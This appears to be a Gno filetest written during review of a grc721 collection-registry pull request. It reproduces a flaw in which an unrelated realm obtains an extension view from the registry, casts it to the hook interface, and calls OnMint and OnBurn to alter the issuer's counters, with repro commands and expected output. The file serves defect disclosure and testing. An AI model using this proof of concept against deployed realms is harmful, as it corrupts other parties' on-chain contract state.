// PKGPATH: gno.land/r/tests/attacker6075

// A realm that never held the ledger drives a collection's extension hooks,
// because RegisterExtension accepts the hook object as its own view and
// Token.ExtensionView hands that view to anyone holding the *Token.
//
// Repro, from a plain clone of gnolang/gno at 74ec1b3e1 with gno built from it on PATH,
// T being reviews/pr/6xxx/6075-grc721reg-collection-registry/3-74ec1b3e1/tests in gno-agent-workspace
//   mkdir -p examples/gno.land/r/tests/issuer6075
//   printf 'module = "gno.land/r/tests/issuer6075"\ngno = "0.9"\n' > examples/gno.land/r/tests/issuer6075/gnomod.toml
//   cp $T/b2-catalog-view-hook-leak-issuer.gno examples/gno.land/r/tests/issuer6075/issuer.gno
//   cp $T/b2-catalog-view-hook-leak_filetest.gno examples/gno.land/r/tests/issuer6075/z_hook_leak_filetest.gno
//   cd examples && GNOROOT=$PWD/.. gno test ./gno.land/r/tests/issuer6075/ -v
// PASS means the defect holds, the counter moving while the supply stays 1.

package attacker6075

import (
	"gno.land/p/demo/tokens/grc721"
	"gno.land/r/demo/defi/grc721reg"
	issuer "gno.land/r/tests/issuer6075"
)

func main(cur realm) {
	println("before: mints", issuer.Mints(), "burns", issuer.Burns(), "supply", issuer.Supply())
	v, ok := grc721reg.GetExtension(issuer.Key, "counter")
	println("view found:", ok)
	hook, isHook := v.(grc721.Extension)
	println("view is a hook:", isHook)
	hook.OnMint(address("g1wdhk6et0dej47h6lta047h6lta047h6lrnerlk"), "999")
	hook.OnBurn("1")
	println("after: mints", issuer.Mints(), "burns", issuer.Burns(), "supply", issuer.Supply())
}

// Output:
// before: mints 1 burns 0 supply 1
// view found: true
// view is a hook: true
// after: mints 2 burns 1 supply 1
